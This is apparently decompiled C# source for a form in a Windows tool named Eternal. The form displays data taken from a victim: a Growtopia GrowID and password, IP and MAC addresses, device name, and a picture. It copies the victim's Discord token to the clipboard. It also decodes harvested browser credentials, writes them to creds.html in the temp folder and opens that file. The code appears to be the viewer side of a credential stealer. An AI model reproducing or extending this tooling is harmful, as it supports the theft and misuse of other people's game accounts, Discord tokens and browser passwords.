using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Eternal.Extensions;
using MaterialSkin;
using MaterialSkin.Controls;

namespace Eternal
{
	// Token: 0x02000005 RID: 5
	public partial class Informations : MaterialForm
	{
		// Token: 0x0600001E RID: 30 RVA: 0x00004AF4 File Offset: 0x00002CF4
		public Informations()
		{
			MaterialSkinManager skinManager = MaterialSkinManager.Instance;
			base.SkinManager.AddFormToManage(this);
			base.SkinManager.Theme = MaterialSkinManager.Themes.DARK;
			base.SkinManager.ColorScheme = new ColorScheme(Primary.Blue600, Primary.Blue800, Primary.Blue900, Accent.Blue100, TextShade.WHITE);
			this.InitializeComponent();
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00004B64 File Offset: 0x00002D64
		private void Informations_Load(object sender, EventArgs e)
		{
			this.gidtxt.Text = "GrowID: " + Accdata.growid;
			this.pwdtxt.Text = "Password: " + Accdata.password;
			this.materialLabel4.Text = "IP: " + Accdata.ipaddress;
			this.materialLabel5.Text = "MAC: " + Accdata.mac;
			this.materialLabel6.Text = "Device Name: " + Accdata.pcname;
			try
			{
				WebRequest request = WebRequest.Create(Accdata.picture);
				using (WebResponse response = request.GetResponse())
				{
					using (Stream stream = response.GetResponseStream())
					{
						this.pictureBox1.Image = Image.FromStream(stream);
					}
				}
			}
			catch (Exception)
			{
				Application.DoEvents();
			}
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00004C78 File Offset: 0x00002E78
		private void materialLabel1_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = !string.IsNullOrEmpty(Accdata.dctoken);
				if (flag)
				{
					Clipboard.SetText(Accdata.dctoken);
				}
			}
			catch
			{
				MessageBox.Show("Token is null");
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00004CC8 File Offset: 0x00002EC8
		private void openOnBrowserToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Process.Start(Accdata.picture);
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00004CD8 File Offset: 0x00002ED8
		private void materialButton1_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = Accdata.browsercreds.Contains("Not Activated");
				if (!flag)
				{
					try
					{
						File.WriteAllText(Path.GetTempPath() + "\\creds.html", Accdata.browsercreds.Base64Decode());
					}
					catch
					{
						File.WriteAllText(Path.GetTempPath() + "\\creds.html", Accdata.browsercreds);
					}
					Process.Start(Path.GetTempPath() + "\\creds.html");
				}
			}
			catch (Exception a)
			{
				MessageBox.Show(a.Message);
			}
		}
	}
}
